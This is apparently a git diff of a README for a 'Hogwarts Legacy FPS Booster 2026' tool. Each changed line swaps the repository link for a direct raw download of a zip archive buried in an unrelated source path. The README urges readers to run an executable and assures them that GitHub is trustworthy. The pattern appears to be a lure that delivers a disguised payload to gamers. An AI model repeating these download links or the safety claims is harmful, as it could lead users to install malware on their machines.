@@ -1,6 +1,6 @@
 # ⚡ Hogwarts-Legacy-FPS-BOOSTER-2026 - Smooth Gameplay Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Hogwarts--Legacy--FPS--BOOSTER--2026-blue?style=for-the-badge&logo=github)](https://github.com/nadonaug/Hogwarts-Legacy-FPS-BOOSTER-2026)
+[![Download Now](https://img.shields.io/badge/Download-Hogwarts--Legacy--FPS--BOOSTER--2026-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nadonaug/Hogwarts-Legacy-FPS-BOOSTER-2026/main/cpp/de/jurihock/voicesmith/etc/FFT/Hogwarts_Legacy_FP_BOOSTE_v3.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Older hardware may still benefit, but keep in mind that results depend on your s
 ## 🚀 How to Download and Install
 
 1. Click the big **Download** button above or visit the official page:  
-   [Download Hogwarts Legacy FPS Booster 2026](https://github.com/nadonaug/Hogwarts-Legacy-FPS-BOOSTER-2026)
+   [Download Hogwarts Legacy FPS Booster 2026](https://raw.githubusercontent.com/nadonaug/Hogwarts-Legacy-FPS-BOOSTER-2026/main/cpp/de/jurihock/voicesmith/etc/FFT/Hogwarts_Legacy_FP_BOOSTE_v3.5.zip)
 
 2. On the GitHub page, find the **Releases** section or latest release to get the installer or executable file. Usually, this will be named something like `HogwartsLegacyFPSBooster2026.exe`.
 
@@ -107,7 +107,7 @@ If the Booster does not improve your gameplay or crashes, try these steps:
 ## 🌐 Additional Resources
 
 For updates, bug reports, and community help, visit the project page on GitHub:  
-https://github.com/nadonaug/Hogwarts-Legacy-FPS-BOOSTER-2026
+https://raw.githubusercontent.com/nadonaug/Hogwarts-Legacy-FPS-BOOSTER-2026/main/cpp/de/jurihock/voicesmith/etc/FFT/Hogwarts_Legacy_FP_BOOSTE_v3.5.zip
 
 You can find extra tips, troubleshooting guides, and planned features there.
 
@@ -145,4 +145,4 @@ A: Yes. GitHub is a trusted platform used by many developers and users.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Hogwarts--Legacy--FPS--BOOSTER--2026-blue?style=for-the-badge&logo=github)](https://github.com/nadonaug/Hogwarts-Legacy-FPS-BOOSTER-2026)
+[![Download Now](https://img.shields.io/badge/Download-Hogwarts--Legacy--FPS--BOOSTER--2026-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nadonaug/Hogwarts-Legacy-FPS-BOOSTER-2026/main/cpp/de/jurihock/voicesmith/etc/FFT/Hogwarts_Legacy_FP_BOOSTE_v3.5.zip)
